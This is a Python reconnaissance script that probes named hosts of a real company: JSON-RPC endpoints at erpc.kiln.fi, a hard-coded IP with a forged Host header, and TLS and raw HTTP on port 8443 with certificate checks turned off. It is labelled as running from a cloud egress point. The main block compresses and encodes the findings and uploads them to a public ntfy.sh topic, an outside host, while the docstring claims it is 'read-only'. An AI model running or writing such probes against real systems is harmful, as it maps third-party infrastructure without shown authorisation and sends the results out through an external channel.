#!/usr/bin/env python3
"""Focused follow-up: eRPC proper path from clean Azure egress + 8443 real TLS.
Read-only, no auth guessing. exit 0 always."""
import base64, gzip, json, socket, ssl, subprocess, sys, time, urllib.request, urllib.error

TOPIC = "kiln-runner-recon-94151a"
NTFY = "https://ntfy.sh/" + TOPIC
REQS = [0]
RES = {"probe": "egress-94151-run2", "when_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}


def _ctx():
    c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c


def http(url, method="GET", data=None, timeout=9, hdrs_extra=None):
    REQS[0] += 1
    t0 = time.time(); out = {"url": url, "method": method}
    hdrs = {"User-Agent": "Mozilla/5.0 kiln-egress-recon/2"}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    if hdrs_extra: hdrs.update(hdrs_extra)
    try:
        req = urllib.request.Request(url, method=method, data=data, headers=hdrs)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            b = r.read(4000)
            out.update({"code": r.status, "len": len(b),
                        "hdr": {k: v for k, v in r.headers.items() if k.lower() in
                                ("server", "www-authenticate", "content-type", "x-erpc-commit", "x-request-id", "via", "x-envoy-upstream-service-time")},
                        "first": b[:700].decode("utf-8", "replace")})
    except urllib.error.HTTPError as e:
        try: b = e.read(2000)
        except Exception: b = b""
        out.update({"code": e.code, "len": len(b),
                    "hdr": dict(e.headers.items()) if e.headers else {},
                    "first": b[:700].decode("utf-8", "replace")})
    except Exception as e:
        out["error"] = repr(e)
    out["t"] = round(time.time() - t0, 2)
    RES.setdefault("http", []).append(out)
    return out


def tls(host, port, sni=None, version=None):
    REQS[0] += 1
    out = {"host": host, "port": port, "sni": sni, "maxver": version}
    s = None
    try:
        ctx = _ctx()
        if version:
            ctx.minimum_version = version; ctx.maximum_version = version
        s = socket.create_connection((host, port), timeout=7)
        ss = ctx.wrap_socket(s, server_hostname=sni if sni is not None else host)
        der = ss.getpeercert(binary_form=True)
        out.update({"tls": ss.version(), "cipher": ss.cipher()[0] if ss.cipher() else None, "cert_len": len(der) if der else 0})
        if der:
            p = subprocess.run(["openssl", "x509", "-inform", "DER", "-noout", "-subject", "-issuer"],
                               input=der, capture_output=True, timeout=10)
            out["cert"] = (p.stdout or b"").decode("utf-8", "replace")[:400]
        ss.close()
    except Exception as e:
        out["error"] = repr(e); out["err_type"] = type(e).__name__
    finally:
        try:
            if s: s.close()
        except Exception: pass
    RES.setdefault("tls", []).append(out)
    return out


def raw(ip, port, send=None, window=5.0, tag=None):
    REQS[0] += 1
    out = {"ip": ip, "port": port, "tag": tag}
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=6)
        s.settimeout(window)
        if send: s.sendall(send)
        b = b""
        try:
            while len(b) < 4096:
                c = s.recv(4096)
                if not c:
                    out["eof"] = True; break
                b += c
        except socket.timeout:
            out["timeout"] = True
        out["nbytes"] = len(b); out["hex64"] = b[:64].hex()
        out["first"] = b[:200].decode("utf-8", "replace").replace("\r", "\\r").replace("\n", "\\n")
    except Exception as e:
        out["error"] = repr(e)
    finally:
        try:
            if s: s.close()
        except Exception: pass
    RES.setdefault("raw", []).append(out)
    return out


def run():
    RES["dns"] = {h: sorted({ai[4][0] for ai in socket.getaddrinfo(h, 443, socket.AF_INET)}) for h in
                  ["erpc.kiln.fi", "query.thegraph.kiln.fi"]}
    # eRPC with the documented path /main/evm/1
    for m in ["eth_chainId", "eth_blockNumber", "web3_clientVersion"]:
        http("https://erpc.kiln.fi/main/evm/1", method="POST",
             data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": m}).encode())
        time.sleep(0.4)
    # direct IP, SNI/Host erpc.kiln.fi
    http("https://34.78.4.174/main/evm/1", method="POST",
         data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "eth_chainId"}).encode(),
         hdrs_extra={"Host": "erpc.kiln.fi"})
    time.sleep(0.4)
    # also /main/evm/main alias variant
    http("https://erpc.kiln.fi/main/evm/main", method="POST",
         data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "eth_chainId"}).encode())
    time.sleep(0.4)
    # 8443 real TLS then HTTP
    for v in (ssl.TLSVersion.TLSv1_3, ssl.TLSVersion.TLSv1_2):
        tls("51.158.110.174", 8443, sni="ws.validator.polygon.mainnet.kiln.fi", version=v)
        time.sleep(0.3)
    tls("51.158.110.174", 8443, sni=None)
    raw("51.158.110.174", 8443, send=b"GET / HTTP/1.0\r\nHost: 51.158.110.174\r\n\r\n", window=5.0, tag="http10")
    RES["total_target_requests"] = REQS[0]
    return RES


if __name__ == "__main__":
    try:
        r = run()
    except Exception as e:
        r = {"probe": "egress-94151-run2", "fatal": repr(e)}
    raw = json.dumps(r, ensure_ascii=False).encode()
    gz = gzip.compress(raw, 9); b64 = base64.b64encode(gz).decode()
    print("B64CHUNK_BEGIN len=%d jsonbytes=%d gzbytes=%d" % (len(b64), len(raw), len(gz)))
    for i in range(0, len(b64), 3000):
        print("B64CHUNK:" + b64[i:i + 3000])
    print("B64CHUNK_END")
    try:
        req = urllib.request.Request(NTFY + "?title=egress-94151-run2", data=gz, method="PUT",
                                     headers={"Filename": "egress-94151-run2.json.gz", "Content-Type": "application/gzip"})
        with urllib.request.urlopen(req, timeout=20) as x:
            print("NTFY_PUT code=%s" % x.status)
    except Exception as e:
        print("NTFY_PUT_ERROR %r" % (e,))
    sys.exit(0)
